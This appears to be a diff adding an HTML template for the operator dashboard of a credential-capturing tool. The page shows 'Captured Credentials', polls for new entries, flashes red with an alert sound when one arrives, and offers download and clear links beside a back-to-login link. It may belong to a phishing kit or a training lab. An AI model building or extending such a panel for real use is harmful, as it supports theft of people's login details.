@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Captured Logs</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+  <button id="toggleMode" class="toggle-btn">🌙 Dark Mode</button>
+  <div class="container">
+    <h2>🧾 Captured Credentials</h2>
+
+    <div class="log-box" id="logContainer">Loading logs...</div>
+
+    <a href="/" class="back-btn">← Back to Login</a>
+    <a href="/logout" class="back-btn">🚪 Log Out</a>
+    <a href="/download-logs" class="view-logs-btn">📥 Download Logs</a>
+    <a href="/clear-logs" class="view-logs-btn danger">🧹 Clear Logs</a>
+  </div>
+
+  <audio id="alertSound" src="{{ url_for('static', filename='alert.mp3') }}" preload="auto"></audio>
+
+  <script>
+  let lastLogCount = 0;
+  const container = document.getElementById("logContainer");
+
+  function fetchLogs() {
+    fetch("/logs-fragment")
+      .then(response => response.text())
+      .then(html => {
+        const parser = new DOMParser();
+        const newDoc = parser.parseFromString(html, "text/html");
+        const newEntries = newDoc.querySelectorAll(".log-entry");
+
+        const oldEntries = container.querySelectorAll(".log-entry");
+
+        // 🔔 Play alert if new entries are detected
+        if (newEntries.length > lastLogCount) {
+          document.getElementById("alertSound").play();
+          document.body.style.backgroundColor = "#ff2222";
+          setTimeout(() => {
+            document.body.style.backgroundColor = "";
+          }, 300);
+        }
+
+        // 💾 Update logs visually
+        container.innerHTML = "";
+        newEntries.forEach(entry => {
+          container.appendChild(entry);
+        });
+
+        lastLogCount = newEntries.length;
+      });
+  }
+
+  fetchLogs();
+  setInterval(fetchLogs, 5000);
+
+  // 🌙 Dark mode toggle
+  const toggleButton = document.getElementById("toggleMode");
+
+  function applyTheme(mode) {
+    if (mode === "dark") {
+      document.body.classList.add("dark-mode");
+      toggleButton.textContent = "☀️ Light Mode";
+    } else {
+      document.body.classList.remove("dark-mode");
+      toggleButton.textContent = "🌙 Dark Mode";
+    }
+  }
+
+  function toggleDarkMode() {
+    const isDark = document.body.classList.toggle("dark-mode");
+    const mode = isDark ? "dark" : "light";
+    localStorage.setItem("theme", mode);
+    toggleButton.textContent = isDark ? "☀️ Light Mode" : "🌙 Dark Mode";
+  }
+
+  toggleButton.addEventListener("click", toggleDarkMode);
+  const savedTheme = localStorage.getItem("theme") || "light";
+  applyTheme(savedTheme);
+</script>
+
+</body>
+</html>
